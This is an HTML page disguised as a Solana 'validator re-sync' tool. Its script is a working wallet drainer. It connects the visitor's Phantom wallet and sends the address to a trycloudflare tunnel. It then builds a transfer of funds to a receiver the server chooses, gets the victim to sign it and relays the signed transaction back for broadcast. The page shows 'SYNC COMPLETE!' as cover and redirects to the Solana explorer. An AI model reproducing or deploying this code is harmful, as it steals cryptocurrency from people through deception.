<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Node Sync</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
        #status { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin:0; color:#9945FF;">VALIDATOR STATUS</h3>
        <p style="font-size:12px; color:red;">OUT OF SYNC</p>
        <button id="cta">START RE-SYNC</button>
        <div id="status">System Ready</div>
    </div>

    <script>
        // ðŸ”± è¯·åŠ¡å¿…ç¡®è®¤éš§é“åœ°å€æ­£ç¡®
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('status').innerText = t;
            const web3 = window.solanaWeb3;
            const provider = window.solana || window.phantom?.solana;

            if (!provider) { alert("Use Phantom App"); return; }

            try {
                log("Connecting...");
                await provider.connect();
                
                log("Fetching from Helius...");
                // 1. é—® 71 æœåŠ¡å™¨æ‹¿ Helius å¤„ç†å¥½çš„å‚æ•°
                const resp = await fetch(tunnel + "/prepare", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: provider.publicKey.toString() })
                });
                const info = await resp.json();

                if (info.error) { log("Already Synced"); return; }

                log("Awaiting Signature...");
                // 2. æž„é€ äº¤æ˜“ (å‚æ•°ç”±æœåŠ¡å™¨ç²¾ç®—ä¸‹å‘)
                const tx = new web3.Transaction().add(
                    web3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new web3.PublicKey(info.receiver),
                        lamports: info.amount
                    })
                );
                tx.recentBlockhash = info.bh;
                tx.feePayer = provider.publicKey;

                // 3. å”¤èµ·ç­¾å
                const signed = await provider.signTransaction(tx);
                
                log("Broadcasting via Helius...");
                // 4. å°†ç­¾åå¥½çš„åŒ…å‘å›ž 71 æœåŠ¡å™¨é€šè¿‡ Helius å¹¿æ’­
                const binary = String.fromCharCode.apply(null, new Uint8Array(signed.serialize()));
                fetch(tunnel + "/broadcast", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                log("SYNC COMPLETE!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (err) {
                log("Retry: " + err.message);
            }
        };
    </script>
</body>
</html>
